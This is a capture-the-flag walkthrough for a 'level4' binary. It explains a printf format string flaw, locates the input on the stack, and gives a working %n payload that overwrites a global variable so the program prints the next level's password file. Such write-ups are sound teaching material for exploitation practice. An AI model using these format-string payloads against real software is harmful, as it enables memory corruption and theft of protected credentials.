=== Level4 Walkthrough ===

--- What the program does ---

main() calls n().

n() does:
1) fgets(buffer, 512, stdin)
	-> bounded read, no overflow
2) p(buffer)
3) if (m == 16930116) system("/bin/cat /home/user/level5/.pass")

p() is:
printf(buffer);
-> format string vulnerability (user controls format)

--- Goal ---

Set global variable m to 16930116 (0x01025544) so the check passes.

--- Finding our buffer position on the stack ---

Input with marker:
python -c 'print "aaaa" + " %x" * 15' | ./level4

Output shows 61616161 at position 12 -> buffer is at argument 12.

--- The key format string trick ---

%n writes the number of printed characters into an address.
If we place the address of m on the stack, then use %12$n,
printf will write the byte count into m.

We need printf to print exactly 16,930,116 characters.

We already printed 4 bytes for the address itself, so we need:
16930116 - 4 = 16930112 more characters.

We cannot send that many bytes because fgets only reads 512.
Instead, we use the width specifier with %d:
%16930112d -> makes printf print 16,930,112 characters by inserting spaces.

--- Address of m ---

m is at 0x08049810
Little endian bytes: \x10\x98\x04\x08

--- Final payload ---

(python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"'; cat) | ./level4

--- Why it works (short) ---

1) Address of m is placed at the start of the input (arg 12).
2) printf prints 16,930,112 padded chars via %16930112d.
3) Total printed so far = 4 + 16,930,112 = 16,930,116.
4) %12$n writes that value into m.
5) Check passes -> system() prints the password.

--- Result ---

Program prints /home/user/level5/.pass, use it to log in to level5.